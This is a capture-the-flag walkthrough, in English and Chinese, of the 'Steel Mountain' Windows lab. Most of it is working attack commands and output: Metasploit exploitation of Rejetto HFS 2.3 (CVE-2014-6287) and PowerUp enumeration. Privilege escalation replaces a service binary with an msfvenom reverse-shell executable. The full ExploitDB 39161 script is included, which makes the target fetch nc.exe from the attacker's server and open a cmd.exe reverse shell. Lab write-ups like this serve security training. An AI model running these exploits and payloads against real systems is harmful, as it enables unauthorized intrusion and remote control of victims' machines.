# Steel Mountain
 `this machine does not respond to ping (ICMP)`
## nmap 
```
nmap -sV -sC -Pn 10.10.34.174                              130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 11:33 EST
Nmap scan report for 10.10.34.174
Host is up (0.26s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-01-18T16:35:11+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-01-17T16:31:26
|_Not valid after:  2022-07-19T16:31:26
|_ssl-date: 2022-01-18T16:35:15+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:77:d0:a6:c9:c5 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-01-18T16:35:09
|_  start_date: 2022-01-18T16:31:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.27 seconds
```

## go 8080 port 
```
HttpFileServer 2.3

google:HttpFileServer 2.3

```
 # task2 

 ```
 1.8080 

 2. Rejetto HTTP File Server

 3. CVE:2014-6287


 4. msf :
  search 2014-6287

  use 0 exploit/windows/http/rejetto_hfs_exec

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.9.1.50
lhost => 10.9.1.50
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.235.130
rhosts => 10.10.235.130
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run

 ```

 ## meterpreter
 ```
cd C:\Users\bill\Desktop

type user.txt
b04763b6fcf51fcd7c13abc7db4fd365

 ```


 # task3

 ## upload script

 ```
 meterpreter > upload /tmp/PowerUp.ps1
[*] uploading  : /tmp/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /tmp/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /tmp/PowerUp.ps1 -> PowerUp.ps1

 ```

 ## load powershell 

 ```
meterpreter > upload /opt/PowerUp.ps1
[*] uploading  : /opt/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /opt/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /opt/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_s
powershell_session_remove  powershell_shell
meterpreter > powershell_shell 
PS > ls

    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         1/20/2022   1:15 AM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---         1/20/2022   1:26 AM     600580 PowerUp.ps1
```
## Error
```
PS > Invoke-AllChecks
ERROR: Invoke-AllChecks : The term 'Invoke-AllChecks' is not recognized as the name of a cmdlet, function, script file, or
ERROR: operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
ERROR: again.
ERROR: At line:1 char:1
ERROR: + Invoke-AllChecks
ERROR: + ~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (Invoke-AllChecks:String) [], CommandNotFoundException
ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
ERROR: 
PS > .\PowerUp.ps1
PS > Invoke-AllChecks
ERROR: Invoke-AllChecks : The term 'Invoke-AllChecks' is not recognized as the name of a cmdlet, function, script file, or
ERROR: operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
ERROR: again.
ERROR: At line:1 char:1
ERROR: + Invoke-AllChecks
ERROR: + ~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (Invoke-AllChecks:String) [], CommandNotFoundException
ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
ERROR: 
```




```
PS > . .\PowerUp.ps1     
PS > Invoke-AllChecks    


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files




```
密切注意設置為 true 的 CanRestart 選項。顯示為未引用服務路徑漏洞的服務名稱是什麼？   

`AdvancedSystemCareService9`
CanRestart 選項為真，允許我們重新啟動系統上的服務，應用程序的目錄也是可寫的。這意味著我們可以用我們的惡意應用程序替換合法應用程序，重新啟動服務，這將運行我們受感染的程序！

## msfvenom
```
┌──(root💀kali)-[/opt]
└─# msfvenom -p windows/shell_reverse_tcp lhost=10.9.1.50 lport=4343 -e  x86/shkata_ga_nai -f exe -o ASCService.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
[-] Skipping invalid encoder x86/shkata_ga_nai
[!] Couldn't find encoder to use
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe

```
## 先停用服務
```
PS > sc stop AdvancedSystemCareService9

```

## upload 到 C:\Program Files (x86)\IObit
有時候路徑要加上詭異斜線`Program\ Files\ (x86)`
```
meterpreter > upload /opt/ASCService.exe
[*] uploading  : /opt/ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /opt/ASCService.exe -> ASCService.exe
[*] uploaded   : /opt/ASCService.exe -> ASCService.exe

```
`copy ASCService.exe "Advanced SystemCare\ASCService.exe"`    
覆蓋原本的ASCService.exe 再重新啟動
```
Directory of C:\Program Files (x86)\IObit

01/20/2022  01:57 AM    <DIR>          .
01/20/2022  01:57 AM    <DIR>          ..
01/20/2022  02:00 AM    <DIR>          Advanced SystemCare
01/20/2022  01:56 AM            73,802 ASCService.exe
09/26/2019  09:35 PM    <DIR>          IObit Uninstaller
09/26/2019  07:18 AM    <DIR>          LiveUpdate
01/20/2022  01:56 AM             5,861 SystemCare
               2 File(s)         79,663 bytes
               5 Dir(s)  44,153,434,112 bytes free

C:\Program Files (x86)\IObit>copy ASCService.exe "/Advanced SystemCare"
copy ASCService.exe "/Advanced SystemCare"
Access is denied.
        0 file(s) copied.

C:\Program Files (x86)\IObit>copy ASCService.exe "Advanced SystemCare\ASCService.exe"
copy ASCService.exe "Advanced SystemCare\ASCService.exe"
Overwrite Advanced SystemCare\ASCService.exe? (Yes/No/All): All
All
        1 file(s) copied.

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

```
sc start AdvancedSystemCareService9
會啟動msvenom出的exe

## 接收reverse shell 
```
msf6 >  use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lport 4343
lport => 4343
msf6 exploit(multi/handler) > set lhost 10.9.1.50 
lhost => 10.9.1.50
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.1.50:4343 
[*] Command shell session 1 opened (10.9.1.50:4343 -> 10.10.22.1:49282 ) at 2022-01-20 05:18:24 -0500


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Windows\system32>
```
## root.txt 
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80

```
# task4 
## 終端1
run `python2 39161.py 10.10.22.1 8080    
`   
https://www.exploit-db.com/exploits/39161
```
import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "10.9.1.50" #local IP address
	local_port = "8888" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
	
```

## 終端2
`http server`    
https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
```
第一次

python3 -m http.server 80                                                                  1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.22.1 - - [20/Jan/2022 06:29:04] code 404, message File not found
10.10.22.1 - - [20/Jan/2022 06:29:04] "GET /nc.exe HTTP/1.1" 404 -
10.10.22.1 - - [20/Jan/2022 06:29:04] code 404, message File not found
10.10.22.1 - - [20/Jan/2022 06:29:04] "GET /nc.exe HTTP/1.1" 404 -

發現是找不到nc.exe 因為下載下來的是ncat.exe

所以mv ncat.exe nc.exe

第二次執行  python2 39161.py 10.10.22.1 8080 

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.22.1 - - [20/Jan/2022 06:35:02] "GET /nc.exe HTTP/1.1" 200 -
10.10.22.1 - - [20/Jan/2022 06:35:02] "GET /nc.exe HTTP/1.1" 200 -
10.10.22.1 - - [20/Jan/2022 06:35:03] "GET /nc.exe HTTP/1.1" 200 -
10.10.22.1 - - [20/Jan/2022 06:35:03] "GET /nc.exe HTTP/1.1" 200 -

然後終端3就有反應
```


## 終端3
`nc`

```
nc -nvlp 8888                                                                           130 ⨯
listening on [any] 8888 ...
connect to [10.9.1.50] from (UNKNOWN) [10.10.22.1] 49531
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

```